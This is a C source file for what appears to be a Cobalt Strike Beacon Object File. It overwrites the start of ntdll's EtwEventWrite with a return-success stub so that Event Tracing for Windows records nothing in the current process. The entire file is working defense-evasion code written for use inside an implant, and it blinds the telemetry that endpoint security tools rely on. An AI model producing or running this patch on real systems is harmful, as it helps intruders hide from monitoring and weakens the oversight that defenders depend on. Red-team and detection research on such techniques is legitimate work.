/*
 * patch_etw.c — Patch EtwEventWrite to silently drop all events
 *
 * Overwrites the first bytes of ntdll!EtwEventWrite with a stub
 * that returns STATUS_SUCCESS (0), effectively blinding any ETW
 * consumers in the current process.
 *
 * Args: none
 */

#include <windows.h>

#define BOF
#include "beacon.h"

/* ── DFR imports ── */
DFR(KERNEL32, GetModuleHandleA)
DFR(KERNEL32, GetProcAddress)
DFR(KERNEL32, VirtualProtect)

void go(char* args, int len)
{
    /* ntdll.dll is always loaded — use GetModuleHandle, not LoadLibrary */
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "patch_etw: GetModuleHandleA(\"ntdll.dll\") failed (err %lu)",
                     GetLastError());
        return;
    }

    /* Resolve EtwEventWrite */
    FARPROC pEtwEventWrite = KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "patch_etw: GetProcAddress(\"EtwEventWrite\") failed (err %lu)",
                     GetLastError());
        return;
    }

    /*
     * Patch bytes:
     *   33 C0   xor eax, eax   ; eax = 0 (STATUS_SUCCESS / ERROR_SUCCESS)
     *   C3      ret
     *
     * Every call to EtwEventWrite now returns success without
     * writing any event data.
     */
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
    DWORD patchLen = sizeof(patch);

    /* Make the target region writable */
    DWORD oldProtect = 0;
    if (!KERNEL32$VirtualProtect((LPVOID)pEtwEventWrite, patchLen, PAGE_READWRITE, &oldProtect)) {
        BeaconPrintf(CALLBACK_ERROR, "patch_etw: VirtualProtect(RW) failed (err %lu)",
                     GetLastError());
        return;
    }

    /* Write the patch */
    for (DWORD i = 0; i < patchLen; i++) {
        ((unsigned char*)pEtwEventWrite)[i] = patch[i];
    }

    /* Restore original page protection */
    DWORD tmp = 0;
    KERNEL32$VirtualProtect((LPVOID)pEtwEventWrite, patchLen, oldProtect, &tmp);

    BeaconPrintf(CALLBACK_OUTPUT, "ETW patched — EtwEventWrite now returns STATUS_SUCCESS (no-op)");
}
